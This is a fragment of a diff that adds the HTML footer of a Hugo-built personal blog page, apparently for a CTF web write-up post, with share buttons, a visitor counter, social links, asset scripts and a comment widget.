+        <i class="fab fa-2x fa-fw fa-x-twitter mb-2"></i> X
+      </a>
+      <a class="btn-social-share d-flex flex-column align-items-center me-3" rel="noopener noreferrer" aria-label="Facebook Share Button"
+        target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fxiaochai-123.github.io%2fposts%2fhgame-2026-web-wp%2f">
+        <i class="fab fa-2x fa-fw fa-facebook-f mb-2"></i> Facebook
+      </a>
+    </div>
+    <hr class="mb-4"><div class="actions d-flex overflow-auto align-items-center">
+      <a role="button" class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform="rotate-90"></i></span> Go back
+      </a>
+      <a role="button" class="action action-reload-page d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
+      </a>
+      <a role="button" class="action action-copy-url d-flex flex-column align-items-center me-3">
+        <span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL
+      </a>
+  </div>
+    </div>
+  </div>
+</div><div class="row text-center">
+  <div class="col-12 mt-2">
+    <p class="mb-2">xiaochai_123的小窝</p>
+    <p class="text-secondary mb-2"><small>Welcome to xiaochai_123’s Blog! I look forward to sharing this great journey with you.</small></p>© 2026 xiaochai-123. 欢迎转载但请注明出处 | 本博客内容版权所有
+    <div class="footer-line visitor" style="margin: 0.5em 0;">
+      <span id="busuanzi_container_site_uv" title="总访客数" style="display: inline;">
+        👤 总访客数 <span id="busuanzi_value_site_uv">...</span>
+      </span>
+      <span id="busuanzi_container_site_pv" class="footer-divider" title="总访问量" style="display: inline; margin-left: 1em;">
+        👁️ 总访问量 <span id="busuanzi_value_site_pv">...</span>
+      </span>
+    </div>
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div class="powered-by mb-2 text-secondary">
+  <small>
+    Build with ❤️ from the <a class="text-primary" href="https://gohugo.io" target="_blank" rel="noopener noreferrer">Hugo</a> and the <a class="text-primary" href="https://github.com/razonyang/hugo-theme-bootstrap" target="_blank" rel="noopener noreferrer">HBS</a> theme.
+  </small>
+</div>
+
+
+<nav class="social-links nav justify-content-center mb-2 mt-3">
+    <a class="nav-link social-link p-0 me-1 mb-2" href="mailto:mailto:l2556843965@163.com" title="Email">
+      <i class="fas fa-fw fa-2x fa-envelope" style="color: #0963ac;"></i>
+    </a>
+      <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" href="https://github.com/xiaochai-123" title="GitHub" rel="me">
+        <i class="fa-fw fa-2x fab fa-github"
+          ></i>
+      </a>
+  <a class="nav-link social-link p-0 me-1 mb-2" target="_blank" data-rss-feed href="https://xiaochai-123.github.io/index.xml" title="RSS" rel="me">
+    <i class="fas fa-fw fa-2x fa-rss" style="color: #ea6221;"></i>
+  </a>
+</nav>
+</div>
+  <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
+</div>
+<script src="/js/copy-code.js"></script>
+<link rel="stylesheet" href="/css/copy-code.css">
+</footer>
+<script data-precache src="/assets/main/bundle.min.5f7fecfd2a8f9951e8efea436dc08e86e678d38ab9eeb343e3d1324d57f3f64a.js" integrity="sha256-X3/s/SqPmVHo7&#43;pDbcCOhuZ404q57rND49EyTVfz9ko=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
+<script src="https://giscus.app/client.js"
+    data-repo="xiaochai-123/xiaochai-123.github.io"
+    data-repo-id="R_kgDOQcBRNA"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOQcBRNM4Cy98G"
+    data-mapping="pathname"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    defer>
+</script>
+
+
+  </body>
+</html>
